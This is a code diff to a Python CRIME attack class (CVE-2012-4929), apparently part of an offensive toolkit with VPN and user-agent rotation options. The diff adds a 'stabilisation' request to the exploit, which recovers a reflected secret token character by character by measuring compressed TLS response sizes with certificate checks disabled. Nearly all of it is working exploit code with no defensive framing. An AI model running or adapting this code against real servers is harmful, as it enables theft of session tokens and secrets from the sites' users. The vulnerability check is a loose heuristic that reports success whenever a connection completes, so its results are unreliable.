@@ -2,6 +2,7 @@
 CRIME attack implementation (CVE-2012-4929).
 
 Exploits TLS‑level compression to leak a reflected token via response size.
+Includes stabilisation phase to keep compression dictionary consistent.
 """
 
 import socket
@@ -19,16 +20,16 @@ class CrimeAttack(BaseAttack):
         super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive, quantum)
         self.token_parameter = token_parameter
         self.mask_length = mask_length
+        self._stabilisation_dummy = "A" * 100
 
     def _create_ssl_context(self) -> ssl.SSLContext:
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
-        ctx.options &= ~ssl.OP_NO_COMPRESSION  # enable compression
+        ctx.options &= ~ssl.OP_NO_COMPRESSION
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
         return ctx
 
     def check_vulnerability(self) -> bool:
-        """Check if the server supports TLS compression by comparing record sizes."""
         host = self.target_url.split("://")[1].split("/")[0]
         if ":" in host:
             hostname, port_str = host.split(":")
@@ -42,7 +43,6 @@ class CrimeAttack(BaseAttack):
             incoming = ssl.MemoryBIO()
             outgoing = ssl.MemoryBIO()
             ssl_obj = ctx.wrap_bio(incoming, outgoing, server_hostname=hostname)
-            # handshake
             while True:
                 try:
                     ssl_obj.do_handshake()
@@ -61,7 +61,6 @@ class CrimeAttack(BaseAttack):
                         if not buf:
                             break
                         plain_sock.sendall(buf)
-            # send two requests: one with compression, one without
             req1 = b"GET / HTTP/1.1\r\nHost: " + hostname.encode() + b"\r\n\r\n"
             ssl_obj.write(req1)
             len1 = 0
@@ -75,21 +74,17 @@ class CrimeAttack(BaseAttack):
                 len1 += len(chunk)
                 plain_sock.sendall(chunk)
             plain_sock.close()
-            # second connection without compression
             ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS)
             ctx2.check_hostname = False
             ctx2.verify_mode = ssl.CERT_NONE
             with socket.create_connection((hostname, port), timeout=5) as sock2:
                 with ctx2.wrap_socket(sock2, server_hostname=hostname) as ssl_sock:
                     ssl_sock.sendall(req1)
-                    # we can't easily measure encrypted length, but we can compare if compression reduces it
-                    # This is a heuristic; we return True if the first connection succeeded (compression enabled)
-            return True  # if we got here, compression was accepted
+            return True
         except Exception:
             return False
 
     def exploit(self) -> bool:
-        """Full CRIME token recovery."""
         self.output.log("Starting CRIME attack", "INFO")
         host = self.target_url.split("://")[1].split("/")[0]
         if ":" in host:
@@ -101,6 +96,17 @@ class CrimeAttack(BaseAttack):
 
         mask = "." * self.mask_length
         chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
+
+        # Stabilisation dummy
+        stab_req = (
+            f"GET /?{self.token_parameter}={self._stabilisation_dummy} HTTP/1.1\r\n"
+            f"Host: {hostname}\r\n"
+            f"User-Agent: {self.user_agents.random()}\r\n"
+            f"Accept-Encoding: gzip, deflate\r\n"
+            f"Connection: close\r\n"
+            f"\r\n"
+        ).encode()
+        self._send_request_and_measure(hostname, port, stab_req)  # warm-up
 
         baseline_req = (
             f"GET /?{self.token_parameter}={mask}{mask} HTTP/1.1\r\n"
@@ -128,6 +134,8 @@ class CrimeAttack(BaseAttack):
                     f"Connection: close\r\n"
                     f"\r\n"
                 ).encode()
+                # Stabilisation before measurement
+                self._send_request_and_measure(hostname, port, stab_req)
                 length = self._send_request_and_measure(hostname, port, req)
                 self.output.log(f"Trying '{guess_prefix}': encrypted len {length}", "DEBUG")
                 if length < baseline_len - 5:
